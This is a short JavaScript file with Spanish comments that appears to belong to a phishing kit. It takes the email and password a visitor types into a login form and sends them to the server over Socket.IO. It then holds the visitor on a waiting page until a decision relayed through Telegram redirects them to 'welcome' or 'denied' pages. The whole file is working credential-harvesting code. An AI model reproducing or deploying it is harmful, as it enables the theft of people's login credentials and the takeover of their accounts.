// Conectar con el servidor via Socket.IO
const socket = io();

// Generar sessionId aleatorio y guardarlo si no existe aún
let sessionId = localStorage.getItem("sessionId");
if (!sessionId) {
  sessionId = Math.random().toString(36).substring(2, 15);
  localStorage.setItem("sessionId", sessionId);
}

// Intentar obtener formulario si existe (algunos HTML ya lo manejan directo)
const form = document.querySelector("form");

if (form) {
  form.addEventListener("submit", function (event) {
    event.preventDefault();

    const correo = document.getElementById("correo")?.value;
    const contrasena = document.getElementById("contrasena")?.value;

    if (!correo || !contrasena) {
      alert("Por favor, complete todos los campos.");
      return;
    }

    socket.emit("dataForm", { correo, contrasena, sessionId });

    // Redirigir a la pantalla de espera
    window.location.href = "/opciones.html";
  });
}

// Escuchar respuesta desde Telegram (válido para todos los flujos)
socket.on("respuesta", (data) => {
  const { sessionId: respuestaSessionId, decision } = data;

  if (respuestaSessionId === sessionId) {
    if (decision === "aprobado") {
      window.location.href = "/bienvenido.html";
    } else if (decision === "rechazado") {
      window.location.href = "/denegado.html";
    } else {
      alert("Respuesta desconocida del servidor.");
    }
  }
});
